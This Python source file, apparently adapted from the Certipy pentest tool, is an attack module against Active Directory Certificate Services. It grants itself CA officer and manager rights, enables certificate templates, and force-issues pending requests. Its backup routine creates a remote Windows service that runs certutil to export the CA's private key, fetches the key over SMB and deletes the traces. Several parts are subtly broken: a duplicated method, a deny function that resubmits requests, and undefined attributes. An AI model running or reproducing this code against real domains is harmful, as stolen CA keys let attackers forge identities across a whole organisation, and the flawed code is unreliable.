# From certipy github: https://github.com/ly4k/Certipy/blob/main/certipy/commands/ca.py , modified by Ceald
import copy
import time
from typing import List, Tuple
import traceback

from impacket.dcerpc.v5 import rpcrt, rrp, scmr
from impacket.dcerpc.v5.dcom.oaut import VARIANT
from impacket.dcerpc.v5.dcomrt import DCOMANSWER, DCOMCALL, IRemUnknown
from impacket.dcerpc.v5.dtypes import DWORD, LONG, LPWSTR, PBYTE, ULONG, WSTR
from impacket.dcerpc.v5.ndr import NDRSTRUCT
from impacket.dcerpc.v5.nrpc import checkNullString
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException
from impacket.ldap import ldaptypes
from impacket.smbconnection import SMBConnection
from impacket.uuid import string_to_bin, uuidtup_to_bin

from certipy.lib.certificate import NameOID, create_pfx, der_to_cert, load_pfx, x509
from certipy.lib.constants import CERTIFICATION_AUTHORITY_RIGHTS
from certipy.lib.errors import translate_error_code
from certipy.lib.kerberos import get_TGS
from certipy.lib.ldap import LDAPConnection, LDAPEntry
from certipy.lib.rpc import (
    get_dce_rpc,
    get_dce_rpc_from_string_binding,
    get_dcom_connection,
)
from certipy.lib.security import CASecurity
from certipy.lib.target import Target

from delta2.scripts.adcs.template import Template
from delta2.scripts.adcs.ldap import Connection

IF_NOREMOTEICERTADMINBACKUP = 0x40
CR_PROP_TEMPLATES = 0x0000001D
CLSID_ICertAdminD = string_to_bin("d99e6e73-fc88-11d0-b498-00a0c90312f3")
CLSID_CCertRequestD = string_to_bin("d99e6e74-fc88-11d0-b498-00a0c90312f3")
IID_ICertAdminD = uuidtup_to_bin(("d99e6e71-fc88-11d0-b498-00a0c90312f3", "0.0"))
IID_ICertAdminD2 = uuidtup_to_bin(("7fe0d935-dda6-443f-85d0-1cfb58fe41dd", "0.0"))
IID_ICertRequestD2 = uuidtup_to_bin(("5422fd3a-d4b8-4cef-a12e-e87d4ca22e90", "0.0"))


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        self.error_code &= 0xFFFFFFFF
        error_msg = translate_error_code(self.error_code)
        return "CASessionError: %s" % error_msg


class CERTTRANSBLOB(NDRSTRUCT):
    structure = (
        ("cb", ULONG),
        ("pb", PBYTE),
    )


class ICertAdminD_ResubmitRequest(DCOMCALL):
    opnum = 5
    structure = (
        ("pwszAuthority", LPWSTR),
        ("pdwRequestId", DWORD),
        ("pwszExtensionName", LPWSTR),
    )


class ICertAdminD_ResubmitRequestResponse(DCOMANSWER):
    structure = (("pdwDisposition", ULONG),)


class ICertAdminD_DenyRequest(DCOMCALL):
    opnum = 6
    structure = (
        ("pwszAuthority", LPWSTR),
        ("pdwRequestId", DWORD),
    )


class ICertAdminD_DenyRequestResponse(DCOMANSWER):
    structure = (("ErrorCode", ULONG),)


class ICertRequestD2_GetCAProperty(DCOMCALL):
    opnum = 7
    structure = (
        ("pwszAuthority", LPWSTR),
        ("PropId", LONG),
        ("PropIndex", LONG),
        ("PropType", LONG),
    )


class ICertRequestD2_GetCAPropertyResponse(DCOMANSWER):
    structure = (("pctbPropertyValue", CERTTRANSBLOB),)


class ICertAdminD2_GetCAProperty(DCOMCALL):
    opnum = 32
    structure = (
        ("pwszAuthority", LPWSTR),
        ("PropId", LONG),
        ("PropIndex", LONG),
        ("PropType", LONG),
    )


class ICertAdminD2_GetCAPropertyResponse(DCOMANSWER):
    structure = (("pctbPropertyValue", CERTTRANSBLOB),)


class ICertAdminD2_SetCAProperty(DCOMCALL):
    opnum = 33
    structure = (
        ("pwszAuthority", LPWSTR),
        ("PropId", LONG),
        ("PropIndex", LONG),
        ("PropType", LONG),
        ("pctbPropertyValue", CERTTRANSBLOB),
    )


class ICertAdminD2_SetCAPropertyResponse(DCOMANSWER):
    structure = (("ErrorCode", ULONG),)


class ICertAdminD2_GetCASecurity(DCOMCALL):
    opnum = 36
    structure = (("pwszAuthority", LPWSTR),)


class ICertAdminD2_GetCASecurityResponse(DCOMANSWER):
    structure = (("pctbSD", CERTTRANSBLOB),)


class ICertAdminD2_SetCASecurity(DCOMCALL):
    opnum = 37
    structure = (("pwszAuthority", LPWSTR), ("pctbSD", CERTTRANSBLOB))


class ICertAdminD2_SetCASecurityResponse(DCOMANSWER):
    structure = (("ErrorCode", LONG),)


class ICertAdminD2_GetConfigEntry(DCOMCALL):
    opnum = 44
    structure = (
        ("pwszAuthority", LPWSTR),
        ("pwszNodePath", LPWSTR),
        ("pwszEntry", WSTR),
    )


class ICertAdminD2_GetConfigEntryResponse(DCOMANSWER):
    structure = (("pVariant", VARIANT),)


class ICertCustom(IRemUnknown):
    def request(self, req, *args, **kwargs):
        req["ORPCthis"] = self.get_cinstance().get_ORPCthis()
        req["ORPCthis"]["flags"] = 0
        self.connect(self._iid)
        dce = self.get_dce_rpc()
        try:
            resp = dce.request(req, self.get_iPid(), *args, **kwargs)
        except Exception as e:
            if str(e).find("RPC_E_DISCONNECTED") >= 0:
                msg = str(e) + "\n"
                msg += (
                    "DCOM keep-alive pinging it might not be working as expected. You "
                    "can't be idle for more than 14 minutes!\n"
                )
                msg += "You should exit the app and start again\n"
                raise DCERPCException(msg)
            else:
                raise
        return resp


class ICertAdminD(ICertCustom):
    def __init__(self, interface):
        super().__init__(interface)
        self._iid = IID_ICertAdminD


class ICertAdminD2(ICertCustom):
    def __init__(self, interface):
        super().__init__(interface)
        self._iid = IID_ICertAdminD2


class ICertRequestD2(ICertCustom):
    def __init__(self, interface):
        super().__init__(interface)
        self._iid = IID_ICertRequestD2


class CA:
    def __init__(self, target: Target, connection: Connection, ca:str = None, template:str = None, officer:str = None, request_id:int = 0):
        self.target = target
        self.connection = connection.connection

        self.template = template
        self.officer = officer
        self.request_id = request_id
        self.ca = ca


        self._cert_admin: ICertAdminD = None
        self._cert_admin2: ICertAdminD2 = None
        self._cert_request2: ICertRequestD2 = None
        self._rrp_dce = None
    
    @property
    def cert_admin(self) -> ICertAdminD:
        if self._cert_admin is not None:
            return self._cert_admin

        dcom = get_dcom_connection(self.target)
        iInterface = dcom.CoCreateInstanceEx(CLSID_ICertAdminD, IID_ICertAdminD)
        iInterface.get_cinstance().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self._cert_admin = ICertAdminD(iInterface)
        return self._cert_admin
    @property
    def cert_admin2(self) -> ICertAdminD2:
        if self._cert_admin2 is not None:
            return self._cert_admin2

        dcom = get_dcom_connection(self.target)
        iInterface = dcom.CoCreateInstanceEx(CLSID_ICertAdminD, IID_ICertAdminD2)
        iInterface.get_cinstance().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self._cert_admin2 = ICertAdminD2(iInterface)

        return self._cert_admin2

    @property
    def cert_request2(self) -> ICertRequestD2:
        if self._cert_request2 is not None:
            return self._cert_request2

        dcom = get_dcom_connection(self.target)
        iInterface = dcom.CoCreateInstanceEx(CLSID_CCertRequestD, IID_ICertRequestD2)
        iInterface.get_cinstance().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self._cert_request2 = ICertRequestD2(iInterface)

        return self._cert_request2

    @property
    def rrp_dce(self):
        if self._rrp_dce is not None:
            return self._rrp_dce

        dce = get_dce_rpc_from_string_binding(
            "ncacn_np:445[\\pipe\\winreg]", self.target, timeout=self.target.timeout
        )
        for _ in range(3):
            try:
                dce.connect()
                dce.bind(rrp.MSRPC_UUID_RRP)
                break
            except Exception as e:
                if "STATUS_PIPE_NOT_AVAILABLE" in str(e):
                    time.sleep(1)
                else:
                    raise e
        else:
            return None
        self._rrp_dce = dce
        return self._rrp_dce

    def get_exchange_certificate(self) -> x509.Certificate:
        request = ICertRequestD2_GetCAProperty()
        request["pwszAuthority"] = checkNullString(self.ca)
        request["PropId"] = 0x0000000F
        request["PropIndex"] = 0
        request["PropType"] = 0x00000003

        resp = self.cert_request2.request(request)

        exchange_cert = der_to_cert(b"".join(resp["pctbPropertyValue"]["pb"]))

        return exchange_cert

    def get_config_csra(self) -> Tuple[int, int, int, CASecurity]:
        request = ICertAdminD2_GetConfigEntry()
        request["pwszAuthority"] = checkNullString(self.ca)
        request["pwszNodePath"] = checkNullString(
            "PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy"
        )
        request["pwszEntry"] = checkNullString("RequestDisposition")

        resp = self.cert_admin2.request(request)

        request_disposition = resp["pVariant"]["_varUnion"]["lVal"]

        request["pwszEntry"] = checkNullString("EditFlags")

        resp = self.cert_admin2.request(request)

        edit_flags = resp["pVariant"]["_varUnion"]["lVal"]

        request["pwszNodePath"] = checkNullString("")
        request["pwszEntry"] = checkNullString("InterfaceFlags")

        resp = self.cert_admin2.request(request)

        interface_flags = resp["pVariant"]["_varUnion"]["lVal"]

        request = ICertAdminD2_GetCASecurity()
        request["pwszAuthority"] = checkNullString(self.ca)

        resp = self.cert_admin2.request(request)

        security = CASecurity(b"".join(resp["pctbSD"]["pb"]))

        return (edit_flags, request_disposition, interface_flags, security)
    def get_config_csra(self) -> Tuple[int, int, int, CASecurity]:
        request = ICertAdminD2_GetConfigEntry()
        request["pwszAuthority"] = checkNullString(self.ca)
        request["pwszNodePath"] = checkNullString(
            "PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy"
        )
        request["pwszEntry"] = checkNullString("RequestDisposition")

        resp = self.cert_admin2.request(request)

        request_disposition = resp["pVariant"]["_varUnion"]["lVal"]

        request["pwszEntry"] = checkNullString("EditFlags")

        resp = self.cert_admin2.request(request)

        edit_flags = resp["pVariant"]["_varUnion"]["lVal"]

        request["pwszNodePath"] = checkNullString("")
        request["pwszEntry"] = checkNullString("InterfaceFlags")

        resp = self.cert_admin2.request(request)

        interface_flags = resp["pVariant"]["_varUnion"]["lVal"]

        request = ICertAdminD2_GetCASecurity()
        request["pwszAuthority"] = checkNullString(self.ca)

        resp = self.cert_admin2.request(request)

        security = CASecurity(b"".join(resp["pctbSD"]["pb"]))

        return (edit_flags, request_disposition, interface_flags, security)


    def get_config_rrp(self) -> Tuple[int, int, int, CASecurity]:
        hklm = rrp.hOpenLocalMachine(self.rrp_dce)

        h_root_key = hklm["phKey"]

        policy_key = rrp.hBaseRegOpenKey(
            self.rrp_dce,
            h_root_key,
            (
                "SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\%s\\"
                "PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy"
            )
            % self.ca,
        )

        _, edit_flags = rrp.hBaseRegQueryValue(
            self.rrp_dce, policy_key["phkResult"], "EditFlags"
        )

        _, request_disposition = rrp.hBaseRegQueryValue(
            self.rrp_dce, policy_key["phkResult"], "RequestDisposition"
        )

        configuration_key = rrp.hBaseRegOpenKey(
            self.rrp_dce,
            h_root_key,
            "SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\%s" % self.ca,
        )

        _, interface_flags = rrp.hBaseRegQueryValue(
            self.rrp_dce, configuration_key["phkResult"], "InterfaceFlags"
        )

        _, security_descriptor = rrp.hBaseRegQueryValue(
            self.rrp_dce, configuration_key["phkResult"], "Security"
        )

        security_descriptor = CASecurity(security_descriptor)

        return (edit_flags, request_disposition, interface_flags, security_descriptor)


    def get_config(self) -> Tuple[int, int, int, CASecurity]:
        e1 = None
        try:
            result = self.get_config_csra()
            return result
        except Exception as e:
            print('1  -----------------------')
            print(traceback.format_exc())
            e1 = e
        try:

            result = self.get_config_rrp()
            return result
        except Exception as e:
            print("2 ------------------------")
            print(traceback.format_exc())
            return (e, e1)

    def issue(self) -> bool:
        if self.request_id is None:
            print(
                (
                    "A request ID (-request-id) is required in order to issue a pending"
                    " or failed certificate request"
                )
            )
            return False

        request = ICertAdminD_ResubmitRequest()
        request["pwszAuthority"] = checkNullString(self.ca)
        request["pdwRequestId"] = int(self.request_id)

        try:
            resp = self.cert_admin.request(request)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                print("Got access denied trying to issue certificate")
                return False
            raise e

        error_code = resp["pdwDisposition"]

        if error_code == 3:
            print("Successfully issued certificate")
        else:
            error_msg = translate_error_code(error_code)
            print(
                "Got error while trying to issue certificate: %s" % (error_msg)
            )
            return error_msg

        return True
    def deny(self) -> bool:
        if self.request_id is None:
            return False
        
        request = ICertAdminD_ResubmitRequest()
        request["pwszAuthority"] = checkNullString(self.ca)
        request["pdwRequestId"] = int(self.request_id)
        try:
            resp = self.cert_admin.request(request)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                return False
            raise Exception(str(e))
        error_code = resp["pdwDisposition"]

        if error_code == 3:
            return True
        else:
            msg = translate_error_code(error_code)
            raise Exception(str(msg))

    def get_templates(self) -> str:
        if self.ca is None:
            # logging.error("A CA (-ca) is required")
            return False

        request = ICertAdminD2_GetCAProperty()
        request["pwszAuthority"] = checkNullString(self.ca)
        request["PropId"] = CR_PROP_TEMPLATES
        request["PropIndex"] = 0
        request["PropType"] = 4

        try:
            resp = self.cert_admin2.request(request)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                # logging.error("Got access denied while trying to get templates")
                return None
            raise e

        certificate_templates = (
            b"".join(resp["pctbPropertyValue"]["pb"]).decode("utf-16le").split("\n")
        )

        return certificate_templates
    def list_templates(self) -> list:
        certificate_templates = self.get_templates()

        if certificate_templates is None:
            return

        if len(certificate_templates) == 1:
            print(
                "There are no enabled certificate templates on %s" % repr(self.ca)
            )
            return
        templates = []
        print("Enabled certificate templates on %s:" % repr(self.ca))
        for i in range(0, len(certificate_templates) - 1, 2):
            templates.append(certificate_templates[i])
        return templates
    
    def enable(self, disable: bool = False) -> bool:
        if self.ca is None:
            return False
        if self.template is None:
            return False
        certificate_templates = self.get_templates()
        template = Template(connection=self.connection)
        template = template.get_config(self.template)
        if template is None:
            return False
        action = "enabl"
        if disable:
            action = "disabl"
            if template.get("cn") not in certificate_templates:
                return False
            
            certificate_templates = (
                certificate_templates[: certificate_templates.index(template.get("cn"))]
                + certificate_templates[
                    certificate_templates.index(template.get("cn")) + 2 :
                ]
            )
        else:
            certificate_templates = [
                template.get("cn"),
                template.get("msPKI-Cert-Template-OID"),
            ] + certificate_templates
        certificate_templates = [
            bytes([c]) for c in "\n".join(certificate_templates).encode("utf-16le")
        ]
        request = ICertAdminD2_SetCAProperty()
        request["pwszAuthority"] = checkNullString(self.ca)
        request["PropId"] = CR_PROP_TEMPLATES
        request["PropIndex"] = 0
        request["PropType"] = 4
        request["pctbPropertyValue"]["cb"] = len(certificate_templates)
        request["pctbPropertyValue"]["pb"] = certificate_templates

        try:
            resp = self.cert_admin2.request(request)
        except DCERPCSessionError as e:
            # if "E_ACCESSDENIED" in str(e):
            #     return False
            raise e
        
        error_code = resp['ErrorCode']
        if error_code == 0:
            return True
        else:
            msg = translate_error_code(error_code)
            raise Exception(msg)

    def disable(self):
        return self.enable(disable=True)
    
    def add(self, user, right, right_type):
        connection = self.connection

        user = connection.get_user(user)
        if user is None:
            return False
        sid = ldaptypes.LDAP_SID(data=user.get_raw("objectSid")[0])

        request = ICertAdminD2_GetCASecurity()
        request["pwszAuthority"] = checkNullString(self.ca)

        try:
            resp = self.cert_admin2.request(request)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                return False
            raise e
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd.fromString(b"".join(resp["pctbSD"]["pb"]))

        for i in range(len(sd["Dacl"]["Data"])):
            ace = sd["Dacl"]["Data"][i]
            if ace["AceType"] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
                continue

            if ace["Ace"]["Sid"].getData() != sid.getData():
                continue

            if ace["Ace"]["Mask"]["Mask"] & right != 0:
                print(
                    "User %s already has %s rights on %s"
                    % (repr(user.get("sAMAccountName")), right_type, repr(self.ca))
                )
                return True

            ace["Ace"]["Mask"]["Mask"] |= right

            break
        else:
            ace = ldaptypes.ACE()
            ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
            ace["AceFlags"] = 0
            ace["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
            ace["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
            ace["Ace"]["Mask"]["Mask"] = right
            ace["Ace"]["Sid"] = sid

            sd["Dacl"]["Data"].append(ace)

        sd = [bytes([c]) for c in sd.getData()]

        request = ICertAdminD2_SetCASecurity()
        request["pwszAuthority"] = checkNullString(self.ca)
        request["pctbSD"]["cb"] = len(sd)
        request["pctbSD"]["pb"] = sd

        try:
            resp = self.cert_admin2.request(request)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                # logging.error("Got access denied while trying to add %s" % right_type)
                # return False
                print(e)
            raise e
        error_code = resp["ErrorCode"]
        if error_code == 0:
            return(
                "Successfully added %s %s on %s"
                % (right_type, repr(user.get("sAMAccountName")), repr(self.ca))
            )
        else:
            error_msg = translate_error_code(error_code)
            raise(
                "Got error while trying to add %s: %s" % (right_type, error_msg)
            )
            return False
    def remove(self, user, right, right_type):
        connection = self.connection

        user = connection.get(user)
        if user is None:
            return False
        sid = ldaptypes.LDAP_SID(data=user.get_raw("objectSid")[0])

        request = ICertAdminD2_GetCASecurity()
        request["pwszAuthority"] = checkNullString(self.ca)

        try:
            resp = self.cert_admin2.request(request)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                return False
            raise e
        
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd.fromString(b"".join(resp["pctbSD"]["pb"]))
        for i in range(len(sd["Dacl"]["Data"])):
            ace = sd["Dacl"]["Data"][i]
            if ace["AceType"] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
                continue

            if ace["Ace"]["Sid"].getData() != sid.getData():
                continue

            if ace["Ace"]["Mask"]["Mask"] & right == 0:
                raise Exception(
                    "User %s does not have %s rights on %s"
                    % (repr(user.get("sAMAccountName")), right_type, repr(self.ca))
                )
                return True

            ace["Ace"]["Mask"]["Mask"] ^= right

            if ace["Ace"]["Mask"]["Mask"] == 0:
                sd["Dacl"]["Data"].pop(i)
            break
        else:
            raise Exception(
                "User %s does not have %s rights on %s"
                % (repr(user.get("sAMAccountName")), right_type, repr(self.ca))
            )
            return True

        sd = [bytes([c]) for c in sd.getData()]
        request = ICertAdminD2_SetCASecurity()
        request["pwszAuthority"] = checkNullString(self.ca)
        request["pctbSD"]["cb"] = len(sd)
        request["pctbSD"]["pb"] = sd

        try:
            resp = self.cert_admin2.request(request)
        except DCERPCSessionError as e:
            if "E_ACCESSDENIED" in str(e):
                raise Exception(
                    "Got access denied while trying to remove %s" % right_type
                )
                return False
            raise e
        error_code = resp["ErrorCode"]
        if error_code == 0:
            return f"deleted {user}"
        else:
            error_msg = translate_error_code(error_code)
            raise Exception(error_msg)
    def add_officer(self, officer: str) -> bool:
        return self.add(
            officer, CERTIFICATION_AUTHORITY_RIGHTS.MANAGE_CERTIFICATES.value, "officer"
        )

    def remove_officer(self, officer: str) -> bool:
        return self.remove(
            officer, CERTIFICATION_AUTHORITY_RIGHTS.MANAGE_CERTIFICATES.value, "officer"
        )

    def add_manager(self, manager: str) -> bool:
        return self.add(
            manager, CERTIFICATION_AUTHORITY_RIGHTS.MANAGE_CA.value, "manager"
        )

    def remove_manager(self, manager: str) -> bool:
        return self.remove(
            manager, CERTIFICATION_AUTHORITY_RIGHTS.MANAGE_CA.value, "manager"
        )

    def get_enrollment_services(self) -> List["LDAPEntry"]:
        enrollment_services = self.connection.search(
            "(&(objectClass=pKIEnrollmentService))",
            search_base="CN=Enrollment Services,CN=Public Key Services,CN=Services,%s"
            % self.connection.configuration_path,
        )

        return enrollment_services
    
    def get_enrollment_service(self, ca: str) -> LDAPEntry:
        enrollment_services = self.connection.search(
            "(&(cn=%s)(objectClass=pKIEnrollmentService))" % ca,
            search_base="CN=Enrollment Services,CN=Public Key Services,CN=Services,%s"
            % self.connection.configuration_path,
        )

        if len(enrollment_services) == 0:
            print(
                "Could not find any enrollment service identified by %s" % repr(ca)
            )
            return None

        return enrollment_services[0]
    
    def get_backup(self) -> bytes:
        smbclient = SMBConnection(
            self.target.remote_name, self.target.target_ip, timeout=self.target.timeout
        )
        if self.target.do_kerberos:
            tgs, cipher, session_key, username, domain = get_TGS(
                self.target, self.target.remote_name, "cifs"
            )

            TGS = {}
            TGS["KDC_REP"] = tgs
            TGS["cipher"] = cipher
            TGS["sessionKey"] = session_key

            smbclient.kerberosLogin(
                username,
                self.target.password,
                domain,
                self.target.lmhash,
                self.target.nthash,
                kdcHost=self.target.dc_ip,
                TGS=TGS,
            )
        else:
            smbclient.login(
                self.target.username,
                self.target.password,
                self.target.domain,
                self.target.lmhash,
                self.target.nthash,
            )
        try:
            share = "C$"
            tid = smbclient.connectTree(share)
            file_path = "\\Windows\\Tasks\\certipy.pfx"
        except Exception as e:
            if "STATUS_BAD_NETWORK_NAME" in str(e):
                tid = None
            else:
                raise e
        if tid is None:
            try:
                share = "ADMIN$"
                tid = smbclient.connectTree(share)
                file_path = "\\Tasks\\certipy.pfx"
            except Exception as e:
                if "STATUS_BAD_NETWORK_NAME" in str(e):
                    raise Exception(
                        "Could not connect to 'C$' or 'ADMIN$' on %s"
                        % repr(self.target.target_ip)
                    )
                    return False
                else:
                    raise e

        pfx = None

        def _read_pfx(data: bytes):
            nonlocal pfx
            print("Got certificate and private key")
            pfx = data

        try:
            smbclient.getFile(share, file_path, _read_pfx)
        except Exception as e:
            if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                raise Exception(
                    "Could not find the certificate and private key. This most likely means that the backup failed"
                )

        smbclient.deleteFile(share, file_path)

        return pfx

    def backup(self) -> dict:
        exceptions = []
        dce = get_dce_rpc(
            scmr.MSRPC_UUID_SCMR,
            r"\pipe\svcctl",
            self.target,
            timeout=self.timeout,
            dynamic=self.dynamic,
            verbose=self.verbose,
            auth_level_np=rpcrt.RPC_C_AUTHN_LEVEL_NONE,
        )

        if dce is None:
            raise Exception("Failed to connect to Service Control Manager Remote Protocol")
        
        res = scmr.hROpenSCManagerW(dce)
        handle = res['lpScHandle']

        config = " -config %s" % self.config if self.config else ""

        cmd = (
            r"cmd.exe /c certutil %s -backupkey -f -p certipy C:\Windows\Tasks\Certipy && move /y C:\Windows\Tasks\Certipy\* C:\Windows\Tasks\certipy.pfx"
            % config
        )
        try:
            resp = scmr.hRCreateServiceW(
                dce,
                handle,
                "Certipy",
                "Certipy",
                lpBinaryPathName=cmd,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )

            service_handle = resp["lpServiceHandle"]
        except Exception as e:
            if "ERROR_SERVICE_EXISTS" in str(e):
                resp = scmr.hROpenServiceW(dce, handle, "Certipy")

                service_handle = resp["lpServiceHandle"]

                resp = scmr.hRChangeServiceConfigW(
                    dce,
                    service_handle,
                    lpBinaryPathName=cmd,
                )
            else:
                raise e
        try:
            scmr.hRStartServiceW(dce, service_handle)
        except Exception as e:
            exceptions.append(e)
        e1 = None
        data = None
        try:
            pfx = self.get_backup()
            with open("pfx.p12", "wb") as f:
                f.write(pfx)

            key, cert = load_pfx(pfx, b"certipy")
            common_name = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0]

            pfx = create_pfx(key, cert)

            pfx_out = "%s.pfx" % common_name.value
            
            data = bytearray(pfx)
            with open(pfx_out, "wb") as f:
                f.write(pfx)
            print("Saved certificate and private key to %s" % repr(pfx_out))
        except Exception as e1:
            exceptions.append(Exception("Backup failed: %s" % e1))
        
        cmd = r"cmd.exe /c del /f /q C:\Windows\Tasks\Certipy\* && rmdir C:\Windows\Tasks\Certipy"

        resp = scmr.hRChangeServiceConfigW(
            dce,
            service_handle,
            lpBinaryPathName=cmd,
        )

        try:
            scmr.hRStartServiceW(dce, service_handle)
        except Exception as e:
            exceptions.append(e)
        scmr.hRDeleteService(dce, service_handle)
        scmr.hRCloseServiceHandle(dce, service_handle)

        return {"data": data, "exceptions": exceptions}
